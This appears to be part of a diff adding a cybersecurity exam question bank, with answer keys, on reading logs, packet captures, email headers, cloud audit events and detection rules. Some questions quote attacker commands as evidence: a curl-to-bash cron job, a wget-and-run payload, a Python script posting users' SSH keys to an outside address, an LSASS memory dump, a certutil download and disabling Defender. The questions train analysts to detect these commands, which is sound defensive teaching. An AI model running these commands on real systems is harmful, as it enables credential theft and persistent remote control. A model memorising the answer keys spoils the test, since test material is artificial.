+         def: "Placing instructions in input that a language model processes so that it ignores its intended instructions and follows the attacker's instead."}
+      - {id: cy-1y-ai-policy, type: concept, term: "AI usage policy",
+         def: "The organization's rules for which AI tools staff may use, for what purposes, with which classes of data, and what human review their output needs."}
+      - {id: cy-1y-q15, type: mcq,
+         q: "A mail-filtering model retrains weekly on messages users mark as 'not spam'. An attacker controls 200 mailboxes at a customer and marks thousands of his own phishing emails as 'not spam' over a month. The model then lets that campaign through. What is this?",
+         choices: ["Prompt injection", "Hallucination", "Model poisoning", "Data exposure"],
+         answer: 2,
+         why: "The attacker corrupted the data the model learns from, changing its future decisions. Prompt injection acts on one interaction at run time rather than on training."}
+      - {id: cy-1y-q16, type: mcq,
+         q: "An analyst has two versions of a PowerShell script, one from a clean build and one from a compromised server, each 900 lines long. Which AI use case fits this task, with the result checked by the analyst?",
+         choices: ["Comparing artefacts to highlight and explain the differences", "Event correlation across the SIEM", "Automated containment of the server", "Drafting the executive summary"],
+         answer: 0,
+         why: "Explaining what changed between two versions of a file is comparing artefacts, a task AI does quickly and an analyst can then verify line by line. The other uses are real, but none answers 'what is different here?'."}
+      - {id: cy-1y-q17, type: mcq,
+         q: "A SOC plans to send alert data, including EU customers' names and addresses, to an AI service hosted in another country. Which governance step must come first?",
+         choices: ["Benchmark the model's speed and accuracy on a sample of last month's alerts", "Train analysts to write better prompts", "Turn on the service's dark-mode interface", "Have legal and privacy staff confirm the transfer is lawful"],
+         answer: 3,
+         why: "Personal data crossing borders to a third party raises legal and regulatory questions that must be settled before any use. Speed and prompt quality matter only once the use is lawful."}
+      - {id: cy-1y-m01, type: multi,
+         q: "Which TWO are security benefits of managing infrastructure as code? (Choose TWO.)",
+         choices: ["Changes are reviewed and approved as code before they reach production", "Servers built from it can no longer have vulnerabilities", "Templates can be scanned for insecure settings before deployment", "Logging is no longer needed because the code shows what exists", "Access control on the cloud account becomes unnecessary"],
+         answers: [0, 2],
+         why: "IaC puts configuration through review and lets tools such as Checkov test it before anything is built. It does not remove vulnerabilities, logging or the need to control who can change the account."}
+      - {id: cy-1y-m02, type: multi,
+         q: "Which TWO tasks are good uses of AI in security operations, provided an analyst checks the output? (Choose TWO.)",
+         choices: ["Summarizing a long log file into a timeline of key events", "Making final decisions to wipe production servers without review", "Drafting a first version of an incident report", "Storing the only copy of the evidence", "Replacing the chain of custody record"],
+         answers: [0, 2],
+         why: "Log analysis and document creation are named use cases that save time when checked. Destructive decisions, evidence storage and custody records need human accountability and integrity that a model cannot provide."}
+      - {id: cy-1y-o01, type: order,
+         q: "Put the stages of the threat-intelligence lifecycle in order.",
+         steps: ["Set the requirements: what decisions the intelligence must support", "Collect data from the chosen sources", "Process it into a usable form", "Analyze it to produce intelligence", "Disseminate it to the people who need it", "Gather feedback to refine the requirements"],
+         why: "Intelligence starts with a question, then data is gathered, normalized and analyzed, the result is delivered, and feedback shapes the next round."}
+      - {id: cy-1y-o02, type: order,
+         q: "Order these indicator types from the Pyramid of Pain, from the cheapest for an adversary to change to the most expensive.",
+         steps: ["File hashes", "IP addresses", "Domain names", "Network and host artifacts", "Tools", "Tactics, techniques and procedures"],
+         why: "A hash changes with one byte, an address or domain with a little money, artifacts and tools need rework, and changing how the group operates is hardest of all."}
+
+  - id: cy-1z2
+    title: "Security operations: exam-hard practice"
+    domain: "1"
+    goal: "I can read a raw log line, packet summary, process tree, rule or script, say what it shows and choose the right next step."
+    notes: |
+      Every question here hands you evidence. Read it before the choices, and answer two questions: **what is it**, and **what does it change**?
+
+      **Reading habits**
+
+      - **Direction and count.** Who started the connection, to how many hosts, on which port? One to many is a sweep; many to one is a flood or a spray.
+      - **Answers matter.** A SYN with no reply, a reset and a SYN-ACK mean different things. A 200 after a string of 500s means something worked.
+      - **Parent and path.** System process names from the wrong parent or folder are disguises. An office program, a browser or a web server starting a shell is wrong.
+      - **Rhythm and size.** Fixed intervals and tiny payloads are beaconing; large outbound volume is exfiltration.
+      - **Fields over prose.** In JSON, XML and EVTX, read the event name, the actor and the target before anything else.
+
+      **Decisions**
+
+      - Confirm cheaply before you disrupt.
+      - Once compromise is confirmed, cut the attacker's access before tidying up.
+      - Collect volatile evidence (memory, running processes) before it is lost.
+      - Prefer the control that survives the attacker changing a hash or an address.
+
+      **Formats you will meet:** tcpdump lines, Wireshark display filters, Zeek conn and dns logs, Suricata EVE JSON, Snort rules, Linux auth.log, Windows event IDs, cloud audit JSON, email headers, Sigma YAML, YARA, regular expressions, PowerShell, Python and shell.
+    items:
+      - {id: cy-1z2-q01, type: mcq, best: true,
+         q: "Zeek conn.log for workstation 10.8.1.23 shows: 01:00:04 to 203.0.113.80:443 dur 0.21s orig_bytes 312 resp_bytes 96; 01:05:03 same, 312/96; 01:10:05 same, 312/96; and so on every five minutes all night. The user logged off at 18:00. Which next step is BEST?",
+         choices: ["Block 203.0.113.80 at the perimeter firewall and close the alert", "Use EDR to find which process on 10.8.1.23 makes the connections", "Reimage 10.8.1.23 straight away", "Look up 203.0.113.80 in WHOIS"],
+         answer: 1,
+         why: "The fixed interval, identical small sizes and no user point to beaconing. Finding the process tells you what is infected and how, which every later step depends on.",
+         whys: ["Cuts one channel, but the malware stays and may have backup addresses.", "Best: identifies the implant and its persistence before containment choices are made.", "Destroys the evidence of what the implant was and how it arrived.", "Gives context on the address, but says nothing about what on the host is calling it."]}
+      - {id: cy-1z2-q02, type: mcq,
+         q: "In a capture, an analyst needs only HTTP POST requests sent to 203.0.113.7. Which Wireshark display filter shows them?",
+         choices: ["http.response.code == 200 && ip.dst == 203.0.113.7", "tcp.dstport == 80 && ip.src == 203.0.113.7", "http.request.method == \"GET\" && ip.dst == 203.0.113.7", "http.request.method == \"POST\" && ip.dst == 203.0.113.7"],
+         answer: 3,
+         why: "The method field selects POST requests and ip.dst selects packets going to the server. The second filter shows traffic the server sends to port 80 elsewhere, the reverse direction."}
+      - {id: cy-1z2-q03, type: mcq,
+         q: "tcpdump output: 10.0.0.9.53211 > 10.0.0.20.21: Flags [S]; 10.0.0.20.21 > 10.0.0.9.53211: Flags [R.]; 10.0.0.9.53211 > 10.0.0.20.22: Flags [S]; 10.0.0.20.22 > 10.0.0.9.53211: Flags [S.]; 10.0.0.9.53211 > 10.0.0.20.22: Flags [R]; the pattern continues through port 1024, with [S.] replies only from 22 and 443. What is happening?",
+         choices: ["A SYN scan of one host, which found ports 22 and 443 open", "A SYN flood against 10.0.0.20 from a single source address", "A failed SSH login attempt", "Normal web browsing by 10.0.0.9"],
+         answer: 0,
+         why: "One source probing port after port and resetting after each SYN-ACK is a half-open (SYN) port scan; [R.] means closed and [S.] means open. A flood would hit one port with many packets from varied sources."}
+      - {id: cy-1z2-q04, type: mcq,
+         q: 'Suricata EVE output: {"event_type":"alert","src_ip":"10.1.2.3","dest_ip":"203.0.113.80","dest_port":443,"alert":{"action":"allowed","signature":"ET MALWARE Known C2 TLS certificate","severity":1}}. What does "action":"allowed" tell the analyst?',
+         choices: ["The signature has been disabled by an administrator", "The analyst has already marked the alert as a false positive", "The rule matched but the traffic was not blocked", "The destination is on an allow list and the alert can be ignored"],
+         answer: 2,
+         why: "In detection mode Suricata records 'allowed' for alerts it does not block; an inline sensor set to drop would record 'blocked'. The connection to the suspected C2 server therefore happened."}
+      - {id: cy-1z2-q05, type: mcq,
+         q: 'An IDS rule reads: alert udp $HOME_NET any -> any 53 (msg:"Oversized DNS query"; dsize:>200; sid:1000020;). Which traffic triggers it?',
+         choices: ["DNS replies larger than 200 bytes arriving at internal hosts from the internet", "UDP packets from internal hosts to port 53 with a payload over 200 bytes", "Any DNS query from an internal host to an external resolver", "TCP zone transfers larger than 200 bytes"],
+         answer: 1,
+         why: "The header matches UDP from inside to destination port 53 and dsize tests the payload size, so long outbound queries, a sign of DNS tunnelling, fire it. Replies come from port 53, and the rule is UDP only."}
+      - {id: cy-1z2-q06, type: mcq, best: true,
+         q: "auth.log on an internet-facing server: 412 lines 'Failed password for invalid user ... from 198.51.100.23'; then 'Accepted password for deploy from 198.51.100.23 port 40388 ssh2'; then 'sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/bin/bash'. What should the analyst do FIRST?",
+         choices: ["Add 198.51.100.23 to the SSH deny list", "Disable SSH password authentication and require keys for every user", "Isolate the server as compromised, preserving evidence", "Reset the deploy account's password"],
+         answer: 2,
+         why: "The guessing succeeded and the attacker opened a root shell, so the whole host is compromised. Containment of the host comes first; the other steps are all needed but none of them removes a root intruder.",
+         whys: ["The attacker can return from any other address, and root access already obtained is untouched.", "A good hardening step for later; it does nothing about the attacker who is already in.", "Best: a root shell means the host must be contained, with memory and logs preserved.", "Stops this password working, but root access may already include new keys or accounts."]}
+      - {id: cy-1z2-q07, type: mcq,
+         q: "A proxy log line reads: 10.4.2.19 GET http://203.0.113.15/img/update.png 200 Content-Type: application/x-dosexec 482304 bytes, user agent 'Microsoft BITS/7.8'. What does it show?",
+         choices: ["A normal image download for a web page", "A Windows Update download from Microsoft", "An upload of a large file to an external server", "A Windows executable disguised as an image"],
+         answer: 3,
+         why: "The content type application/x-dosexec marks a Windows PE file whatever the .png name says, and BITS is a built-in download service attackers misuse. Windows Update would come from Microsoft's own hosts, not a bare IP address."}
+      - {id: cy-1z2-q08, type: mcq,
+         q: "Zeek dns.log for one host in ten minutes: 1,800 queries for names such as qkfhzrtoplw.example, xjvbwnaeuq.example and pzlmcrtyvk.example, each a different random-looking domain, almost all answered NXDOMAIN. Two resolved. What does this MOST likely show?",
+         choices: ["Malware using a domain generation algorithm", "DNS tunnelling of data through subdomains of one parent domain", "A misconfigured search suffix on the host", "A user mistyping web addresses"],
+         answer: 0,
+         why: "Many unrelated random domains, almost all unregistered, is a DGA working through its list until it hits the few the operator registered. Tunnelling uses many names under one domain that do resolve."}
+      - {id: cy-1z2-q09, type: mcq,
+         q: "On server FS02: event 4624 logon type 3 for account it-admin from workstation 10.2.7.31 at 03:12:40, then System log event 7045 'A service was installed', service name PSEXESVC, at 03:12:41. Nobody in IT was working. What does this show?",
+         choices: ["A remote desktop session to FS02", "A scheduled Windows update installing a new service on FS02", "PsExec remote execution using it-admin's credentials", "A user mapping a network drive"],
+         answer: 2,
+         why: "PsExec connects over the network (logon type 3) and installs the PSEXESVC service to run commands, a common lateral movement method. Remote desktop would be logon type 10, and mapping a drive installs no service."}
+      - {id: cy-1z2-q10, type: mcq,
+         q: "A SIEM shows event 4688 on a domain controller: process wevtutil.exe, command line wevtutil cl Security, followed one second later by event 1102. No further Security events arrive from that host for an hour. What does this sequence show?",
+         choices: ["Log rotation on schedule", "Someone cleared the Security log to hide activity", "The SIEM agent restarting after an update", "An administrator exporting the log for an audit"],
+         answer: 1,
+         why: "wevtutil cl clears a log and 1102 records that the audit log was cleared: anti-forensics. Exporting would use a different wevtutil command and would not generate 1102. What the SIEM already collected before the clear is still available."}
+      - {id: cy-1z2-q11, type: mcq,
+         q: "EDR process tree on a public web server: w3wp.exe > cmd.exe /c whoami > whoami.exe, followed by w3wp.exe > cmd.exe /c net group \"Domain Admins\" /domain. What is the MOST likely cause?",
+         choices: ["A web shell on the IIS server running attacker commands", "A malicious Office document opened on the server", "An administrator troubleshooting over remote desktop", "A scheduled maintenance script"],
+         answer: 0,
+         why: "w3wp.exe is the IIS worker process; when it starts a shell running reconnaissance commands, something uploaded to the site is executing input from a remote user. An administrator's commands would come from their own session, not the web worker."}
+      - {id: cy-1z2-q12, type: mcq, best: true,
+         q: "A Linux host's shell history: wget http://203.0.113.4/k -O /tmp/.k; chmod +x /tmp/.k; /tmp/.k & rm /tmp/.k; history -c. The process is still running, and ls -l /proc/4242/exe shows /tmp/.k (deleted). The host has been isolated. What should the analyst collect FIRST?",
+         choices: ["A full disk image", "The /var/log directory", "A hash of every file in /tmp", "Memory and a copy of the running binary from /proc/4242/exe"],
+         answer: 3,
+         why: "The binary is gone from disk but still running, so it exists only in memory, which is the most volatile evidence. On Linux it can be recovered through /proc while the process lives.",
+         whys: ["Needed, but the file was deleted from disk and the disk image will not hold the running payload reliably.", "Useful, but logs are far less volatile than the running process.", "/tmp no longer holds the file, so this finds nothing about the payload.", "Best: captures the volatile payload before a reboot or crash loses it for good."]}
+      - {id: cy-1z2-q13, type: mcq,
+         q: "A message to accounts payable: From: \"Chief Executive\" <ceo@corp-exarnple.com>; Reply-To: ceo.office@freemail.example; Authentication-Results: spf=pass smtp.mailfrom=corp-exarnple.com; dkim=pass header.d=corp-exarnple.com; dmarc=pass. The company's domain is corp-example.com. What is the analyst's conclusion?",
+         choices: ["Genuine: SPF, DKIM and DMARC all passed", "Spoofed: the company's own DMARC reject policy failed to stop it", "A lookalike domain with valid authentication, used for BEC", "A compromised internal mailbox"],
+         answer: 2,
+         why: "'exarnple' uses rn to imitate m. The attacker owns that domain, so its own SPF, DKIM and DMARC pass; authentication proves only who sent it, not that the sender is who it seems. The company's DMARC protects only the real domain."}
+      - {id: cy-1z2-q14, type: mcq,
+         q: "Authentication-Results: spf=pass smtp.mailfrom=bulkmailer.example; dkim=pass header.d=bulkmailer.example; dmarc=fail header.from=bank.example. Why did DMARC fail when SPF and DKIM both passed?",
+         choices: ["The DKIM signature was broken in transit", "Neither passing domain aligns with the From domain", "bank.example has no SPF record", "The message was too large for the receiving server's DMARC checks"],
+         answer: 1,
+         why: "DMARC needs SPF or DKIM to pass for a domain aligned with the visible From address. Both passes here belong to bulkmailer.example, not bank.example. A broken signature would show dkim=fail."}
+      - {id: cy-1z2-q15, type: mcq,
+         q: "A command line reads powershell -nop -enc dwBoAG8AYQBtAGkA. Which CyberChef recipe shows the command in readable form?",
+         choices: ["From Hex, then Gunzip", "ROT13, then From Base64", "From Base64, then Decode text as UTF-16LE", "URL Decode, then From Base64"],
+         answer: 2,
+         why: "PowerShell's encoded command is Base64 of UTF-16LE text, which is why every other byte is zero; decoding gives 'whoami'. Decoding as plain ASCII would show the letters separated by null bytes."}
+      - {id: cy-1z2-q16, type: mcq,
+         q: "A web request carries the header Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJqZG9lIiwicm9sZSI6ImFkbWluIn0. (nothing after the second dot). Decoded, the first part is {\"alg\":\"none\",\"typ\":\"JWT\"} and the second {\"sub\":\"jdoe\",\"role\":\"admin\"}. The application accepted it. What does this show?",
+         choices: ["The token is encrypted and could not be read", "The token was signed with a weak secret key that was then cracked", "The token expired but was accepted anyway", "The server accepts unsigned tokens, so anyone can claim admin"],
+         answer: 3,
+         why: "alg none with an empty signature section means there is no signature at all; a server that accepts it lets anyone write their own claims. A cracked key would still show a real algorithm and a signature."}
+      - {id: cy-1z2-q17, type: mcq, best: true,
+         q: "The firewall logs 3,100 SYNs to port 22 from 192.0.2.77 overnight, all dropped. AbuseIPDB gives the address 100% confidence with 4,000 reports for SSH brute force and port scanning. No SSH service is exposed and no session was ever established. Which response is BEST?",
+         choices: ["Declare an incident and wake the incident response team", "Confirm nothing was allowed through, then close as blocked noise", "Report the address to its ISP and wait for a reply", "Hunt for 192.0.2.77 across every endpoint's logs for the past year"],
+         answer: 1,
+         why: "The evidence shows routine internet scanning that the firewall stopped. Checking quickly that nothing got through is enough; anything bigger spends effort on a threat that did not reach the company.",
+         whys: ["Overreacts: nothing was allowed, so there is no incident to respond to.", "Best: proportionate, it verifies the only thing that matters and moves on.", "Rarely effective, and it leaves the alert open for no gain.", "A year-long hunt is far out of proportion to blocked scans with no session."]}
+      - {id: cy-1z2-q18, type: mcq,
+         q: "Running strings on a suspicious file returns: 'This program cannot be run in DOS mode', 'UPX0', 'UPX1', 'UPX!' and almost nothing else readable. What should the analyst conclude?",
+         choices: ["It is packed with UPX; unpack it before static analysis", "The file is a harmless DOS program", "The file is encrypted ransomware output", "It is a corrupted download and can safely be deleted from the share"],
+         answer: 0,
+         why: "UPX0 and UPX1 are the section names the UPX packer creates; packing compresses the real code, which is why so few strings appear. The DOS message is in every Windows executable's stub."}
+      - {id: cy-1z2-q19, type: mcq,
+         q: 'A hunting rule: rule loader { strings: $a1 = "stage2.bin" $a2 = "Mozilla/4.0 (compatible; MSIE 6.0)" $a3 = "cmd /c start" condition: uint16(0) == 0x5A4D and filesize < 200KB and 2 of ($a*) }. Which file matches?',
+         choices: ["A 150 KB PDF containing all three strings", "A 120 KB Windows executable containing only $a1", "A 450 KB Windows executable containing all three strings", "A 150 KB Windows executable containing $a1 and $a3"],
+         answer: 3,
+         why: "All three conditions must hold: the MZ header (bytes 4D 5A, read little-endian as 0x5A4D), a size under 200 KB, and at least two of the strings. The PDF lacks the header and the 450 KB file is too large."}
+      - {id: cy-1z2-q20, type: mcq,
+         q: 'A SIEM search applies the regular expression -[eE][nN][cC]\w*\s+[A-Za-z0-9+/=]{100,} to process command lines. Which command line does it match?',
+         choices: ["powershell -ec followed by a 400-character Base64 string", "powershell -Enc SQBFAFgA", "powershell -nop -EncodedCommand followed by a 400-character Base64 string", "powershell -File C:\\Scripts\\enc.ps1"],
+         answer: 2,
+         why: "The pattern needs -enc in any case, optional further letters (so -EncodedCommand fits), whitespace, then at least 100 Base64 characters. -ec lacks the n, SQBFAFgA is only 8 characters, and -File never contains -enc."}
+      - {id: cy-1z2-q21, type: mcq,
+         q: "A Linux server's history shows: for i in $(seq 1 254); do ping -c1 -W1 10.0.5.$i | grep 'bytes from'; done. What was the user doing?",
+         choices: ["Testing the server's own network card 254 times", "Flooding 10.0.5.0/24 with ICMP traffic", "Measuring latency to the default gateway", "Sweeping 10.0.5.0/24 to find which hosts are alive"],
+         answer: 3,
+         why: "One ping to each address from .1 to .254, keeping only the replies, is a ping sweep: enumeration of live hosts. A flood would send many packets quickly, not one per address with a one-second wait."}
+      - {id: cy-1z2-q22, type: mcq,
+         q: 'A cloud audit event: {"eventName":"PutBucketPolicy","userIdentity":{"userName":"dev-ci"},"requestParameters":{"bucketName":"hr-exports","bucketPolicy":{"Statement":[{"Effect":"Allow","Principal":"*","Action":"s3:GetObject","Resource":"arn:aws:s3:::hr-exports/*"}]}}}. What changed?',
+         choices: ["Anyone can now read every object in hr-exports", "dev-ci lost access to the bucket", "The bucket is now encrypted with a new customer-managed key", "Only the HR team's role can now read objects in the bucket"],
+         answer: 0,
+         why: "Principal \"*\" with Allow on GetObject for every object grants read access to everyone, anonymous users included. Nothing in the policy denies access or concerns encryption."}
+      - {id: cy-1z2-q23, type: mcq,
+         q: "A cloud audit trail shows, two minutes apart, from an unfamiliar address using developer jlee's key: CreateAccessKey with userName=backup-svc, then AttachUserPolicy with userName=backup-svc and policyArn arn:aws:iam::aws:policy/AdministratorAccess. What is the attacker MOST likely doing?",
+         choices: ["Rotating access keys as part of routine credential hygiene", "Creating a second admin foothold that outlives jlee's key", "Deleting the backup service account", "Reading data from a storage bucket"],
+         answer: 1,
+         why: "A new key for a different identity, then full administrator rights for it, gives persistence and privilege escalation: revoking jlee's key will not remove it. Nothing is deleted or read in these two calls."}
+      - {id: cy-1z2-q24, type: mcq,
+         q: "A capture shows a workstation downloading a file named invoice.zip over plain HTTP. The analyst wants the file itself to hash and analyze. Which Wireshark feature retrieves it MOST directly?",
+         choices: ["Statistics > Protocol Hierarchy", "Analyze > Expert Information", "File > Export Objects > HTTP", "Statistics > Conversations"],
+         answer: 2,
+         why: "Export Objects reassembles files carried in HTTP and saves them to disk. Protocol Hierarchy and Conversations summarize traffic, and Expert Information lists anomalies; none of them writes out the file."}
+      - {id: cy-1z2-q25, type: mcq, best: true,
+         q: "EDR alert on a workstation: rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 640 C:\\Windows\\Temp\\d.bin full, where PID 640 is lsass.exe. A domain administrator logged on to this workstation earlier today. What should the analyst do FIRST?",
+         choices: ["Delete C:\\Windows\\Temp\\d.bin", "Upload d.bin to an online scanner", "Isolate the workstation through EDR", "Reset every password in the domain"],
+         answer: 2,
+         why: "This is credential dumping from LSASS memory. Isolating the host stops the dump leaving it and the attacker acting from it; credential resets for the exposed accounts follow at once.",
+         whys: ["The file may already have been copied out, and deleting it destroys evidence.", "Would publish a dump full of the company's credentials.", "Best: contains the host where credentials were stolen, before further spread.", "May be needed, but resetting everything first is slow, disruptive and leaves the attacker on the host."]}
+      - {id: cy-1z2-q26, type: mcq, best: true,
+         q: "A SIEM correlation alert: user mreyes, VPN sign-in from 198.51.100.4 (GeoIP: Lagos) at 09:02, MFA push approved; badge entry at London HQ for mreyes at 08:55. mreyes says she approved 'a few' MFA prompts this morning to make them stop. What should the analyst do FIRST?",
+         choices: ["Revoke mreyes's sessions and reset her password", "Ask mreyes to stop approving prompts she did not start", "Look up 198.51.100.4 on AbuseIPDB", "Report the address to the VPN vendor"],
+         answer: 0,
+         why: "Her own admission confirms MFA fatigue: an attacker with her password got a prompt approved and is now on the VPN. Confirmed compromise calls for cutting the session and the credential first.",
+         whys: ["Best: removes the attacker's live VPN access and the stolen password.", "Needed as awareness, but the attacker is already connected.", "Adds context, but compromise is already confirmed by the user.", "Does nothing about the session already established."]}
+      - {id: cy-1z2-q27, type: mcq,
+         q: "A Sigma rule reads: detection: {selection: {Image|endswith: '\\certutil.exe', CommandLine|contains|all: ['-urlcache', 'http']}, condition: selection}. Which event fires it?",
+         choices: ["certutil.exe -verify C:\\certs\\root.cer", "certutil.exe -urlcache -split -f http://203.0.113.9/a.txt a.exe", "bitsadmin.exe /transfer job1 http://203.0.113.9/a.exe C:\\a.exe", "certutil.exe -urlcache * delete"],
+         answer: 1,
+         why: "The image must end in certutil.exe and the command line must contain both -urlcache and http. The cache-delete command has no http, and bitsadmin is a different binary."}
+      - {id: cy-1z2-q28, type: mcq,
+         q: 'An EVTX record converted to XML: <EventID>4720</EventID> ... <Data Name="TargetUserName">helpdesk2</Data> <Data Name="SubjectUserName">svc_web</Data>. Why is this alarming?',
+         choices: ["The web service account was locked out", "The helpdesk2 account logged on interactively", "The web service account created a new user account", "The audit log was cleared by svc_web"],
+         answer: 2,
+         why: "4720 records the creation of a user account; the subject is who did it and the target is the new account. A web application's service account has no business creating users, which suggests the web server is compromised."}
+      - {id: cy-1z2-q29, type: mcq,
+         q: "A script found on a developer's laptop: import glob, requests; for f in glob.glob('/home/*/.ssh/id_*'): requests.post('http://203.0.113.8/u', data=open(f, 'rb').read()). What does it do?",
+         choices: ["Generates new SSH keys for every user", "Backs up SSH configuration to a company server", "Checks that SSH keys have the correct file permissions set", "Sends every user's SSH key files to an outside server"],
+         answer: 3,
+         why: "The glob matches each user's id_* key files and each file's contents are posted to an external address: credential theft. Nothing is created, checked or sent to an internal destination."}
+      - {id: cy-1z2-q30, type: mcq,
+         q: "A server's crontab gains this entry: */5 * * * * curl -s http://203.0.113.4/s.sh | bash. What does it achieve for the attacker?",
+         choices: ["Runs whatever the remote server sends, every five minutes", "Uploads the server's files every five minutes", "Checks the remote server's availability every five hours", "Downloads one script once at the next reboot"],
+         answer: 0,
+         why: "*/5 in the minute field means every five minutes, and piping curl into bash executes what comes back. The attacker can change the script at any time: persistence with remote control."}
+      # ── multiple response ──
+      - {id: cy-1z2-m01, type: multi,
+         q: "An EDR export lists these parent > child process pairs. Which TWO are suspicious? (Choose TWO.)",
+         choices: ["services.exe > svchost.exe", "winword.exe > cmd.exe", "wininit.exe > lsass.exe", "explorer.exe > chrome.exe", "w3wp.exe > powershell.exe", "services.exe > spoolsv.exe"],
+         answers: [1, 4],
+         why: "A word processor or the IIS worker process starting a shell points to a malicious document or a web shell. The other pairs are how Windows normally starts its services, LSASS and a user's browser."}
+      - {id: cy-1z2-m02, type: multi,
+         q: "In a capture where no host negotiates ECN (so no SYN carries the ECE or CWR flag), which TWO Wireshark display filters show the opening SYN of each TCP handshake while excluding the SYN-ACK reply? (Choose TWO.)",
+         choices: ["tcp.flags.syn == 1", "tcp.flags.syn == 1 && tcp.flags.ack == 0", "tcp.flags.reset == 1", "tcp.flags == 0x002", "tcp.flags.ack == 1"],
+         answers: [1, 3],
+         why: "Requiring SYN set and ACK clear, or the flags field equal to 0x002 (SYN alone), keeps only first packets. syn == 1 alone also matches SYN-ACKs, and the reset and ack filters select other packets."}
+      - {id: cy-1z2-m03, type: multi,
+         q: "Header excerpt: From: \"IT Service Desk\" <helpdesk@corp.example>; Reply-To: helpdesk@corp-support.example; Received: from mail.cheaphost.example (203.0.113.71); Authentication-Results: spf=fail smtp.mailfrom=corp.example; dkim=none; dmarc=fail header.from=corp.example. Which TWO statements are supported by the header? (Choose TWO.)",
+         choices: ["Replies will go to a different domain from the one shown in From", "The message carries a valid DKIM signature for corp.example", "DMARC passed, so the From address is genuine", "The sending server is not authorized in corp.example's SPF record", "The message was sent from inside corp.example's own mail system"],
+         answers: [0, 3],
+         why: "Reply-To points to corp-support.example and spf=fail means 203.0.113.71 is not an allowed sender for corp.example. dkim=none means no signature, DMARC failed, and the message came from an outside host."}
+      - {id: cy-1z2-m04, type: multi,
+         q: "Which THREE are signed programs that ship with Windows and are commonly abused to download or run attacker code? (Choose THREE.)",
+         choices: ["certutil.exe", "mimikatz.exe", "mshta.exe", "nc.exe", "regsvr32.exe", "psexec.exe"],
+         answers: [0, 2, 4],
+         why: "certutil, mshta and regsvr32 are built into Windows and well-known LOLBins. Mimikatz and netcat are attacker tools brought in from outside, and PsExec is a Sysinternals download, not part of Windows."}
+      - {id: cy-1z2-m05, type: multi,
+         q: "A script recovered from a host contains: Set-MpPreference -DisableRealtimeMonitoring $true; New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name Upd -Value 'C:\\ProgramData\\u.exe'. Which TWO things does it do? (Choose TWO.)",
+         choices: ["Turns off Microsoft Defender's real-time protection", "Creates a scheduled task", "Dumps credentials from memory", "Makes u.exe start each time the user logs on", "Clears the Security event log"],
+         answers: [0, 3],
+         why: "Set-MpPreference with that switch disables Defender's real-time scanning, and a value under the Run key starts the program at logon. No task, credential dump or log clearing appears in the script."}
+      - {id: cy-1z2-m06, type: multi,
+         q: "A sandbox report shows the sample did nothing malicious. Which TWO recorded behaviours suggest it detected the sandbox and hid its real behaviour? (Choose TWO.)",
+         choices: ["It checked for VBoxService.exe and virtual-machine MAC address prefixes", "It wrote a value to a registry Run key", "It called Sleep for 30 minutes as soon as it started", "It encrypted files in the user's Documents folder", "It connected to an external address on port 443"],
+         answers: [0, 2],
+         why: "Looking for virtual-machine artefacts and stalling past the sandbox's run time are classic evasion tricks. A Run key, file encryption and a C2 connection are malicious actions themselves, not signs of hiding them."}
+      - {id: cy-1z2-m07, type: multi,
+         q: "An attacker created a local account on a server and made it an administrator. Which TWO Windows Security event IDs record those two steps? (Choose TWO.)",
+         choices: ["4625", "4720", "1102", "4732", "4768"],
+         answers: [1, 3],
+         why: "4720 is 'a user account was created' and 4732 is 'a member was added to a security-enabled local group', such as Administrators. 4625 is a failed logon, 1102 a cleared audit log and 4768 a Kerberos ticket request."}
+      - {id: cy-1z2-m08, type: multi,
+         q: "MXToolbox shows corp.example's DMARC record: v=DMARC1; p=quarantine; pct=25; rua=mailto:dmarc@corp.example. Which TWO statements are true? (Choose TWO.)",
+         choices: ["The quarantine policy is applied to 25% of messages that fail DMARC", "Every message that fails DMARC is rejected outright", "Aggregate reports are sent to dmarc@corp.example", "The policy applies only to messages that pass SPF", "Any message that fails SPF is quarantined even if DKIM passes and aligns"],
+         answers: [0, 2],
+         why: "pct=25 applies the policy to a quarter of failing mail and rua names where aggregate reports go. The policy is quarantine, not reject, and a message with an aligned DKIM pass passes DMARC even if SPF fails."}
+      - {id: cy-1z2-m09, type: multi,
+         q: "A Zeek conn.log shows a workstation's connection to 198.51.100.9:443 lasting 2 hours with orig_bytes 3.1 GB and resp_bytes 38 MB. The address belongs to a file-sharing service the company does not use. Which TWO conclusions or next steps are justified? (Choose TWO.)",
+         choices: ["The workstation sent far more than it received, consistent with data exfiltration", "The workstation downloaded a large file from the service", "The traffic is DNS tunnelling", "Identify the process and files involved using EDR on the workstation", "The connection is a port scan"],
+         answers: [0, 3],
+         why: "In Zeek the originator is the workstation, so 3.1 GB out against 38 MB in is an upload. The next step is to find what was sent and by which process. The port is 443 and there is one long connection, so it is neither DNS nor a scan."}
+      # ── ordering (performance-based stand-ins) ──
+      - {id: cy-1z2-o01, type: order,
+         q: "Put these tcpdump lines for one short HTTPS connection from 10.0.0.9 to 203.0.113.5 in the order they occur.",
+         steps: ["10.0.0.9.51000 > 203.0.113.5.443: Flags [S]", "203.0.113.5.443 > 10.0.0.9.51000: Flags [S.]", "10.0.0.9.51000 > 203.0.113.5.443: Flags [.]", "10.0.0.9.51000 > 203.0.113.5.443: Flags [P.], length 517", "10.0.0.9.51000 > 203.0.113.5.443: Flags [F.]"],
+         why: "The client sends SYN, the server answers SYN-ACK, the client's ACK completes the handshake, data (the TLS ClientHello) follows with PSH, and FIN begins the close."}
+      - {id: cy-1z2-o02, type: order,
+         q: "A suspicious email's Received headers, as they appear top to bottom, are: 'from mx2.corp.example by mail.corp.example'; 'from relay.badhost.example by mx2.corp.example'; 'from [203.0.113.40] by relay.badhost.example'. Put the systems in the order the message passed through them.",
+         steps: ["203.0.113.40", "relay.badhost.example", "mx2.corp.example", "mail.corp.example"],
+         why: "Each server adds its Received header at the top, so the bottom header is the first hop. Reading upward gives the path from the original sender to the final mail server."}
+      - {id: cy-1z2-o03, type: order,
+         q: "Put these Windows processes in the order of the normal parent-to-child chain that starts a service host.",
+         steps: ["System", "smss.exe", "wininit.exe", "services.exe", "svchost.exe"],
+         why: "The kernel's System process starts the session manager, which starts wininit, which starts the service control manager, which starts each svchost. An svchost with any other parent is suspect."}
+      - {id: cy-1z2-o04, type: order,
+         q: "Put the Kerberos messages for a user reaching a file share in order.",
